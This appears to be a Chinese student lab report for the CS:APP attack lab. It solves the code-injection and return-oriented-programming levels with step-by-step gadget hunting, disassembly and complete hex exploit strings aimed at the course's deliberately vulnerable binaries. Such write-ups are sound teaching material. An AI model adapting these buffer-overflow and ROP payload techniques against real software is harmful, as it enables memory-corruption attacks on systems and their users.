# attacklab 实验报告

## CI

### 第一关

实验文档的提示以及很详细了。先找到 getbuf，发现缓冲区的长度为 24 字节；

然后找到 touch1 的地址为 `0x0000000000401695`；

只需先用任意字符串填充缓冲区的 24 字节，然后将后面 return address 的 8 个字节覆盖为 touch1 的地址即可，注意小端法。

```c
00 01 02 03 04 05 06 07 08 09 00 01 02 03 04 05 06 07 08 09 00 01 02 03
95 16 40 00 00 00 00 00
```



### 第二关

这里需要在进入 touch2 之前，提前修改 %rdi 的值，我们可以在栈上注入代码；

我们需要先找到调用 Gets 函数时的栈顶地址，因为这里的栈底地址是固定为 `0x00007fffffffffff`，因此无论运行多少次，走到 Gets 的时候栈顶地址都一定是固定的；

使用 `info regi` 指令，得知此时的栈顶地址为 `0x55654c98`，我们就在这 24 字节长的缓冲区中，注入我们的攻击代码；

攻击代码的汇编形式如下：

```assembly
pushq $0x4016c1 # touch2
movq $0x3d9549ca, %rdi
req
```

使用实验文档的方式得到带有字节代码的汇编代码：

```assembly

ctarget.l2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	68 c1 16 40 00       	pushq  $0x4016c1
   5:	48 c7 c7 ca 49 95 3d 	mov    $0x3d9549ca,%rdi
   c:	c3                   	retq   

```

注入的代码的字节码为：`68 c1 16 40 00 48 c7 c7 ca 49 95 3d c3`。由于长度不足 24 字节，因此使用任意字符 `0x0a` 除外填充至 24 字节，跟上栈顶地址 `0x55654c98`。

```c
68 c1 16 40 00 48 c7 c7 ca 49 95 3d c3 00 00 00 00 00 00 00 00 00 00 00
98 4c 65 55 00 00 00 00
```



### 第三关

这和第二关的区别是，这里需要把 %rdi 赋值为 "3d9549ca" 字符串的首地址，而这个 "3d9549ca" 也需要我们在栈区上注入；

根据实验文档的提示，`调用*hexmatch*和*strncmp*函数时，会将数据压入栈中，覆盖*getbuf*使用的缓冲区的内存，你需要很小心把你的cookie字符串表示放在哪里`。

如果我们把字符串存在 getbuf 的缓冲区中，则 hexmatch 函数中进行比较的时候，%rdi 寄存器存储的地址依然在 getbuf 缓冲区，但是这是我们的 cookie 字符串已经被 hexmatch 函数破坏了；

因此我们需要将 cookie 字符串注入到一个不会被影响的地方。

经过断点调试，发现 getbuf 栈帧开始的 24 个字节，会被 hexmatch 和 strncmp 函数破坏，因此我们只需将 cookie 字符串存到这个区域外，且不能和 getbuf 的 return address 区冲突即可。

那么不妨存到 `0x55654cb8`，我们将 cookie `3d9549ca` 转为对应 ASCII 码的十六进制表示：`33 64 39 35 34 39 63 61`。

注入的代码：

```assembly
pushq $0x4017ad # touch3
movq $0x55654cb8, %rdi
req
```

```assembly
   0:	68 ad 17 40 00       	pushq  $0x4017ad
   5:	48 c7 c7 b8 4c 65 55 	mov    $0x55654cb8,%rdi
   c:	c3                   	retq   
```

`68 ad 17 40 00 48 c7 c7 b8 4c 65 55 c3`

```c
68 ad 17 40 00 48 c7 c7 b8 4c 65 55 c3 00 00 00 00 00 00 00 00 00 00 00
98 4c 65 55 00 00 00 00
33 64 39 35 34 39 63 61
```



## ROP

由于采取了下面两种防护技术：

1. 采用了随机化，每次运行栈的位置都不同。所以无法决定你的注入代码应该放在哪里。
2. 将保存栈的内存区域设置为不可执行，所以即使你能把注入的代码的起始地址放到程序计数器中，程序也会报段错误失败。

查看栈顶地址变得没有意义了，因为每次都不一样。但是只有 Stack 栈底的地址会随机化，Text 区的函数入口们的地址并不会变化，因此可以将 return address 改为这些地址，利用多个片段汇编代码，实现我们的攻击逻辑。

下面是一些常用的 gadget：

![图2](https://course.educg.net/userfiles/markdown/exp/2022_1/748ll1643203261.jpg)

### 第二关

我们能使用的指令如下：

> *movq*：代码如图2A所示。
>
> *popq*；代码如图2B所示。
>
> *ret*：该指令编码为0xc3。
>
> *nop*：该指令编码为0x90。

我们可以将 cookie 存到栈上，使用 pop 指令将其出栈后推导寄存器中。但是 farm 中没有 `popq %rdi`。经过翻找，发现只有一个 `58 90 c3`，可以满足 `popq %rax` 然后 `retq`：

```assembly
0000000000401873 <addval_385>:
  401873:	8d 87 00 58 90 c3    	lea    -0x3c6fa800(%rdi),%eax
  401879:	c3                   	retq   
```

我们只能先 `popq %rax`，然后 `movq %rax %rdi`。翻找后发现 `movq %rax %rdi`(48 89 c7) 有两处：

```assembly
0000000000401858 <setval_422>:
  401858:	c7 07 48 89 c7 c3    	movl   $0xc3c78948,(%rdi)
  40185e:	c3                   	retq   
  
0000000000401866 <setval_246>:
  401866:	c7 07 48 89 c7 c3    	movl   $0xc3c78948,(%rdi)
  40186c:	c3                   	retq   
```

先把前 24 个字节填上，它们没用了；

从 return address 开始，先让 getbuf 的 retq 到 `popq %rax` 指令地址 `0x761840`(小端法)；

此时 getbuf 的 retq 操作已经把 24 个字节后的第一个 8 字节出栈了，此时 %rsp 指向第二个 8 字节，我们手动触发的 popq 操作会把这第二个 8 字节传到 %rax，因此我们必须把 cookie 的立即数存储到这第二个 8 字节 `0xca49953d`(小端法)；

完成后 %rsp 指向第三个 8 字节，addval_385 在执行完 `popq %rax` 后会执行 retq，再一次出栈并跳转，因此我们把 `movq %rax %rdi` 的地址放到第三个 8 字节中 `0x5a1840`(小端法)；

此时 %rsp 指向第四个 8 字节，这里就放 touch2 的地址，用于被 setval_422 的 retq 调用跳转 `0xc11640`(小端法)；

```c
00 01 02 03 04 05 06 07 08 09 00 01 02 03 04 05 06 07 08 09 00 01 02 03
76 18 40 00 00 00 00 00
ca 49 95 3d 00 00 00 00
5a 18 40 00 00 00 00 00
c1 16 40 00 00 00 00 00
```



### 第三关

#### Step 1

这一关和上一关的区别是，这一关需要一个注入字符串的首地址，而上一关是直接取出一整个注入的立即数。取栈上的地址，最容易想到的指令肯定是 `movq %rsp Dest`，找到 `movq %rsp %rax`(48 89 e0)：`341940`(小端法)

```assembly
0000000000401919 <setval_232>:
  401919:	c7 07 c8 48 89 e0    	movl   $0xe08948c8,(%rdi)
  40191f:	c3                   	retq   
  
0000000000401932 <addval_479>:
  401932:	8d 87 48 89 e0 c3    	lea    -0x3c1f76b8(%rdi),%eax
  401938:	c3                   	retq   
```

为了方便叙述，我们给从缓冲区开始的栈地址标上相对地址，从 0x0 开始：

```assembly
0x00 - 0x0f: 00 01 02 03 04 05 06 07 - 08 09 00 01 02 03 04 05
0x10 - 0x1f: 06 07 08 09 00 01 02 03 - movq %rsp,%rax 的地址
0x20 - 0x2f: 00 00 00 00 00 00 00 00 - 00 00 00 00 00 00 00 00
0x30 - 0x3f: 00 00 00 00 00 00 00 00 - 00 00 00 00 00 00 00 00
0x40 - 0x4f: 00 00 00 00 00 00 00 00 - 00 00 00 00 00 00 00 00
0x50 - 0x5f: 00 00 00 00 00 00 00 00 - 00 00 00 00 00 00 00 00
0x60 - 0x6f: 00 00 00 00 00 00 00 00 - 00 00 00 00 00 00 00 00
```

由于执行 movq 指令时，`'movq %rsp,%rax' 的地址` 这 8 个字节已经出栈了，因此 %rax 中记录的地址其实是 0x20。

#### Step 2

这个 0x20 相当于一个基地址，我们还需要一个偏移量才能确定 cookie 字符串的首地址。这需要我们做加法，我们很快发现 farm 有类似功能的函数 add_xy，甚至还贴心的为你写了注释：`871840`(小端法)

```c
/* Add two arguments */
long add_xy(long x, long y)
{
    return x+y;
}
```

```assembly
0000000000401887 <add_xy>:
  401887:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  40188b:	c3                   	retq   
```

这个加法要求我们必须将基址和偏移量存到 %rdi 和 %rsi 中，最后的结果存到 %rax 中。那么这应该是倒数第二个 gadget，最后一个 gadget 是 `movq %rax %rdi`，这在上一关中已经发现了。

#### Step 3

偏移量的具体的值可以通过 gadget 的数量人为计算得到，但是它是一个立即数，怎么将立即数存到寄存器中呢？等等，这不就是上一关的要求吗！我们直接采用 `popq %rax`，然后把偏移量存到这一指令地址的下一个 8 字节中即可：

```assembly
0x00 - 0x0f: 00 01 02 03 04 05 06 07 - 08 09 00 01 02 03 04 05
0x10 - 0x1f: 06 07 08 09 00 01 02 03 - movq %rsp,%rax 的地址
0x20 - 0x2f: movq %rax %rdi 的地址    - popq %rax 的地址
0x30 - 0x3f: 偏移量立即数              - 00 00 00 00 00 00 00 00
0x40 - 0x4f: 00 00 00 00 00 00 00 00 - 00 00 00 00 00 00 00 00
0x50 - 0x5f: 00 00 00 00 00 00 00 00 - 00 00 00 00 00 00 00 00
0x60 - 0x6f: 00 00 00 00 00 00 00 00 - 00 00 00 00 00 00 00 00
```

偏移量立即数在我们得到所有 gadget 后能一眼看出来，因此现在无需在意。

#### Step 4

此时基址存到 %rdi 中，偏移量存到 %rax 中，我们只需将 `movq %rax %rsi` 即可，但是经过查询，没有现成的指令。那么很容易想到利用多个 mov 指令最终把偏移量传到 %rsi 的做法。

我尝试所有 Dest 为 %rsi 的 movq 指令后，发现 farm 中没有这些指令。但是题目提到我们可以使用 movl 指令，以及可以使用 2 字节指令发挥 nop 指令的作用，最终发现 `movl %edx %esi`(89 d6)，后接 2 字节 nop 指令：`141940`(小端法)

```assembly
00000000004018c9 <getval_301>:
  4018c9:	b8 89 d6 20 d2       	mov    $0xd220d689,%eax
  4018ce:	c3                   	retq   
  
0000000000401912 <setval_222>:
  401912:	c7 07 89 d6 08 c0    	movl   $0xc008d689,(%rdi)
  401918:	c3                   	retq   
```

排查所有 `movl Src %esi` 指令后发现，只有 `movl %edx %esi` 存在符合要求的 gadget。

#### Step 5

按照类似 Step 4 的方法，一路向回找，直到找到 %eax。找到 `movl %ecx %edx`，这也是唯一连接 %edx 的指令：`b71840`(小端法)

```assembly
00000000004018a1 <addval_245>:
  4018a1:	8d 87 89 ca 20 c0    	lea    -0x3fdf3577(%rdi),%eax
  4018a7:	c3                   	retq   
  
00000000004018b5 <setval_486>:
  4018b5:	c7 07 89 ca 84 db    	movl   $0xdb84ca89,(%rdi)
  4018bb:	c3                   	retq   
```

然后找连接 %ecx 的指令，直接得到 `movl %eax %ecx`：`211940`(小端法)

```assembly
00000000004018ae <setval_231>:
  4018ae:	c7 07 89 c1 08 db    	movl   $0xdb08c189,(%rdi)
  4018b4:	c3                   	retq   
  
0000000000401920 <getval_201>:
  401920:	b8 89 c1 20 d2       	mov    $0xd220c189,%eax
  401925:	c3                   	retq   
```

于是得到了我们完整的指令链：

```assembly
0x00 - 0x0f: 00 01 02 03 04 05 06 07 - 08 09 00 01 02 03 04 05
0x10 - 0x1f: 06 07 08 09 00 01 02 03 - movq %rsp,%rax 的地址
0x20 - 0x2f: movq %rax %rdi 的地址    - popq %rax 的地址
0x30 - 0x3f: 偏移量立即数              - movl %eax %ecx 的地址
0x40 - 0x4f: movl %ecx %edx 的地址    - movl %edx %esi 的地址
0x50 - 0x5f: %rdi+%rsi=%rax 的地址    - movq %rax %rdi 的地址
0x60 - 0x6f: touch3 的地址            - cookie 字符串
```

其中偏移量立即数 = 0x68 - 0x20 = 0x48

```c
00 01 02 03 04 05 06 07 08 09 00 01 02 03 04 05 06 07 08 09 00 01 02 03
34 19 40 00 00 00 00 00
5a 18 40 00 00 00 00 00
76 18 40 00 00 00 00 00
48 00 00 00 00 00 00 00
21 19 40 00 00 00 00 00
b7 18 40 00 00 00 00 00
14 19 40 00 00 00 00 00
87 18 40 00 00 00 00 00
5a 18 40 00 00 00 00 00
ad 17 40 00 00 00 00 00
33 64 39 35 34 39 63 61
```

